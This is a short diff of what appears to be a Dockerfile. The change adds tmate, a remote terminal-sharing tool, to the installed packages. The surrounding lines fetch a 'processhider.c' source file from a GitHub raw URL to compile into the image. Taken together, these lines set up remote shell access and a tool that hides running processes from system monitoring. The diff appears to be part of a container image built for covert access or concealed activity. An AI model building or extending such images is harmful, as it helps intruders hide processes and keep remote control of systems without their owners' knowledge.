@@ -6,7 +6,7 @@ ENV DEBIAN_FRONTEND=noninteractive
 
 # Update package lists and install necessary packages
 RUN apt-get update && apt-get upgrade -y && apt-get install -y \
-    ssh git wget nano curl python3 python3-pip gcc nginx openssh-server
+    ssh git wget nano curl python3 python3-pip gcc nginx openssh-server tmate
 
 # Download and compile process hider
 RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
